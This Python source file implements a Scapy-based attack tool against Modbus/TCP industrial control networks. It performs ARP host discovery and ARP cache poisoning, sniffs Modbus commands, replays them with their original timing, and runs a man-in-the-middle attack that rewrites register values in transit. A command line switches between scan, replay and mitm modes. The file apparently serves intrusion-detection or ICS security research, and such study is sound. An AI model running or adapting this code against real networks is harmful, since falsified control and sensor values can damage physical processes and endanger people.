import argparse

#from matplotlib.backends.backend_pdf import Reference
from scapy.layers.inet import IP
from scapy.layers.l2 import ARP, Ether
from ModbusPackets import *
from NetworkNode import NetworkNode
from ModbusCommand import ModbusCommand
from protocol import ModbusBase


class ScapyAttacker:
    ARP_MSG_CNT = 2
    BROADCAST_ADDRESS = "ff:ff:ff:ff:ff:ff"

    sniff_commands = []
    sniff_time = None
    error = 0
    modbus_base = ModbusBase()

    @staticmethod
    def discovery(dst):
        nodes = []
        ethernet_layer = Ether(dst=ScapyAttacker.BROADCAST_ADDRESS)
        arp_layer = ARP(pdst=dst)
        ans, un_ans = srp(ethernet_layer / arp_layer, timeout=ScapyAttacker.ARP_MSG_CNT)

        for sent, received in ans:
            nodes.append(NetworkNode(received[ARP].psrc, received[ARP].hwsrc))
        return nodes

    @staticmethod
    def get_mac_address(ip_address):
        pkt = Ether(dst=ScapyAttacker.BROADCAST_ADDRESS) / ARP(pdst=ip_address)
        answered, unanswered = srp(pkt, timeout=ScapyAttacker.ARP_MSG_CNT, verbose=0)

        for sent, received in answered:
            return received[ARP].hwsrc

    @staticmethod
    def poison_arp_table(src, dst):
        print("Poisoning {} <==> {} .... started".format(src.IP, dst.IP), end='')
        gateway_to_target = ARP(op=2, hwdst=src.MAC, psrc=dst.IP, pdst=src.IP)
        target_to_gateway = ARP(op=2, hwdst=dst.MAC, psrc=src.IP, pdst=dst.IP)
    
        try:
            send(gateway_to_target, count=ScapyAttacker.ARP_MSG_CNT, verbose=0)
            send(target_to_gateway, count=ScapyAttacker.ARP_MSG_CNT, verbose=0)

        except Exception as e:
            sys.exit()

        print("[DONE]")

    @staticmethod
    def poison_arp_tables(nodes):
        print("\n Group poisoning [started]...")

        try:
            for src in nodes:
                for dst in nodes:
                    if src.is_switch() or dst.is_switch() or src.IP <= dst.IP:
                        continue
                    ScapyAttacker.poison_arp_table(src, dst)

        except Exception as e:
            sys.exit()

        print("Group poisoning [DONE]")

    @staticmethod
    def restore_arp_table(src, dst):
        print("Restoring... {} and {} .... started".format(src.IP, dst.IP), end='')

        dst_src_fix = ARP(op=2, hwsrc=dst.MAC, psrc=dst.IP, pdst=src.IP, hwdst=ScapyAttacker.BROADCAST_ADDRESS)
        arp_layer = ARP(op=2, hwsrc=src.MAC, psrc=src.IP, pdst=dst.IP, hwdst=ScapyAttacker.BROADCAST_ADDRESS)
        send(dst_src_fix, count=ScapyAttacker.ARP_MSG_CNT, verbose=0)
        send(arp_layer, count=ScapyAttacker.ARP_MSG_CNT, verbose=0)
        print("[DONE]")

    @staticmethod
    def restore_arp_tables(nodes):
        print("Group restoring [started]... ")
        for src in nodes:
            for dst in nodes:
                if src.is_switch() or dst.is_switch() or src.IP <= dst.IP:
                    continue

                ScapyAttacker.restore_arp_table(src, dst)
        print("Group restoring [DONE] ")

    @staticmethod
    def sniff_callback(pkt):
        if not pkt['Ethernet'].dst.endswith(Ether().src):
            return

        if not pkt.haslayer('TCP') or len(pkt['TCP'].payload) <= 0:     # sniffing TCP payload is not possible
            return

        tcp_packet = ModbusTCP(pkt['TCP'].payload.load)
        if tcp_packet.Length == 6 or tcp_packet.Length == 11:
            if tcp_packet.Length == 6:
                modbus_packet = ModbusReadRequestOrWriteResponse(tcp_packet.payload.load)
                value = 0
                if modbus_packet.Command == ModbusCommand.command_write_multiple_registers:
                    return
            else:  # tcp_packet.Length == 11:
                modbus_packet = ModbusWriteRequest(tcp_packet.payload.load)
                value = ScapyAttacker.modbus_base.decode([modbus_packet.Data0, modbus_packet.Data1])

            command = ModbusCommand(
                pkt['IP'].src,
                pkt['IP'].dst,
                pkt['TCP'].dport,
                modbus_packet.Command,
                int(modbus_packet.Reference) /2,    # 2 in the work_num
                value,
                value,

            )

            ScapyAttacker.sniff_commands.append(command)
            print('*', end='')

    @staticmethod
    def inject_callback(pkt):

        if not pkt['Ethernet'].dst.endswith(Ether().src):
            return

        if not pkt.haslayer('IP'):
            return

        new_packet = IP(dst=pkt['IP'].dst, src=pkt['IP'].src)
        new_packet['IP'].payload = pkt['IP'].payload



        if new_packet.haslayer('TCP') and len(new_packet['TCP'].payload) > 0:
            tcp_packet = ModbusTCP(pkt['TCP'].payload.load)
            if tcp_packet.Length == 7 or tcp_packet.Length == 11:
                if tcp_packet.Length == 7:
                    modbus_packet = ModbusReadResponse(tcp_packet.payload.load)
                else:  # tcp_packet.Length == 11:
                    modbus_packet = ModbusWriteRequest(tcp_packet.payload.load)

                value = ScapyAttacker.modbus_base.decode([modbus_packet.Data0, modbus_packet.Data1])

                new_value = value + (value * ScapyAttacker.error)
                values = ScapyAttacker.modbus_base.encode(new_value)

                offset = len(new_packet['TCP'].payload.load) - 4
                new_packet['TCP'].payload.load = (
                        new_packet['TCP'].payload.load[:offset] +
                        values[0].to_bytes(2, 'big') +
                        values[1].to_bytes(2, 'big'))

                reference = 0
                if tcp_packet.Length == 11:
                    reference = modbus_packet.Reference

                command = ModbusCommand(
                    pkt['IP'].src,
                    pkt['IP'].dst,
                    pkt['TCP'].dport,
                    modbus_packet.Command,
                    reference,
                    value,
                    new_value,
                    datetime.now().timestamp()
                )
                ScapyAttacker.sniff_commands.append(command)

        del new_packet[IP].chksum
        del new_packet[IP].payload.chksum
        send(new_packet)

    @staticmethod
    def clear_sniffed():
        ScapyAttacker.sniff_commands = []
        ScapyAttacker.sniff_time = None

    @staticmethod
    def start_sniff(sniff_callback_func, filter_string, timeout):
        ScapyAttacker.clear_sniffed()
        ScapyAttacker.sniff_time = datetime.now().timestamp()
        sniff(prn=sniff_callback_func, filter=filter_string, timeout=timeout)
        print()

    @staticmethod
    def scan_link(target_ip, gateway_ip, timeout):
        # assuming we have performed the reverse attack, we know the following
        ScapyAttacker.clear_sniffed()

        target_mac = ScapyAttacker.get_mac_address(target_ip)
        gateway_mac = ScapyAttacker.get_mac_address(gateway_ip)

        ScapyAttacker.poison_arp_table(NetworkNode(gateway_ip, gateway_mac),
                                       NetworkNode(target_ip, target_mac))
        ScapyAttacker.start_sniff(ScapyAttacker.sniff_callback, "ip host " + target_ip, timeout)
        ScapyAttacker.restore_arp_table(NetworkNode(gateway_ip, gateway_mac),
                                        NetworkNode(target_ip, target_mac))

        return ScapyAttacker.sniff_commands

    @staticmethod
    def scan_network(target, timeout):
        ScapyAttacker.clear_sniffed()

        nodes = ScapyAttacker.discovery(target)
        ScapyAttacker.poison_arp_tables(nodes)
        ScapyAttacker.start_sniff(ScapyAttacker.sniff_callback, "", timeout)
        ScapyAttacker.restore_arp_tables(nodes)

        return ScapyAttacker.sniff_commands

    @staticmethod
    def inject_link(target_ip, gateway_ip, timeout):
        target_mac = ScapyAttacker.get_mac_address(target_ip)
        gateway_mac = ScapyAttacker.get_mac_address(gateway_ip)

        ScapyAttacker.poison_arp_table(NetworkNode(gateway_ip, gateway_mac),
                                       NetworkNode(target_ip, target_mac))
        ScapyAttacker.start_sniff(ScapyAttacker.inject_callback, "ip host " + target_ip, timeout)
        ScapyAttacker.restore_arp_table(NetworkNode(gateway_ip, gateway_mac),
                                        NetworkNode(target_ip, target_mac))

    @staticmethod
    def inject_network(target, timeout):
        nodes = ScapyAttacker.discovery(target)
        ScapyAttacker.poison_arp_tables(nodes)
        ScapyAttacker.start_sniff(ScapyAttacker.inject_callback, "", timeout)
        ScapyAttacker.restore_arp_tables(nodes)

    @staticmethod
    def scan_attack(target, log):
        nodes = ScapyAttacker.discovery(target)
        log.info('# Found {} in the network {}:'.format(len(nodes), target))
        for node in nodes:
            log.info(str(node))

    @staticmethod
    def replay_attack(target, sniff_time, replay_cnt, log):
        if "/" in target:
            ScapyAttacker.scan_network(target, sniff_time)
        else:
            ScapyAttacker.scan_link(target.split(",")[0], target.split(",")[1], sniff_time)

        for i in range(replay_cnt):
            print("Replaying {}".format(i))
            start = datetime.now().timestamp()
            for command in ScapyAttacker.sniff_commands:
                delay = (command.time - ScapyAttacker.sniff_time) - (datetime.now().timestamp() - start)
                if delay > 0:
                    time.sleep(delay)
                command.send_fake()

        log.info('# Sniffed {} packets in the network {}:'.format(len(ScapyAttacker.sniff_commands), target))
        for cmd in ScapyAttacker.sniff_commands:
            log.info(str(cmd))

        print('# Replayed sniffed commands for {} times'.format(replay_cnt))

    @staticmethod
    def mitm_attack(target, sniff_time, error, log):
        ScapyAttacker.error = error
        if "/" in target:
            ScapyAttacker.inject_network(target, sniff_time)
        else:
            ScapyAttacker.inject_link(target.split(",")[0], target.split(",")[1], sniff_time)

        log.info('# Changed {} packets in the network {}:'.format(len(ScapyAttacker.sniff_commands), target))
        for cmd in ScapyAttacker.sniff_commands:
            log.info(str(cmd))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='PCAP reader')
    parser.add_argument('--output', metavar='<csv file name>',
                        help='csv file to output', required=True)
    parser.add_argument('--attack', metavar='determine type of attack',
                        help='attack type could be scan, replay, mitm', required=True)

    parser.add_argument('--timeout', metavar='specify attack timeout', type=int, default=10,
                        help='attack timeout for attacks, MitM/Replay attacks: attack seconds, scan: packets',
                        required=False)

    parser.add_argument('--target', metavar='determine attack target',
                        help='determine attack target', required=False)
    parser.add_argument('--parameter', metavar='determine attack parameter', type=float, default=5,
                        help='determine attack parameter', required=False)

    parser.parse_args()
    args = parser.parse_args()

    handler = logging.FileHandler(args.output, mode="w")
    handler.setFormatter(logging.Formatter('%(message)s'))
    logger = logging.getLogger(args.attack)
    logger.setLevel(logging.INFO)
    logger.addHandler(handler)

    if args.attack == 'scan':
        ScapyAttacker.scan_attack(args.target, logger)

    if args.attack == 'replay':
        ScapyAttacker.replay_attack(args.target, args.timeout, int(args.parameter), logger)

    if args.attack == 'mitm':
        ScapyAttacker.mitm_attack(args.target, args.timeout,  args.parameter, logger)


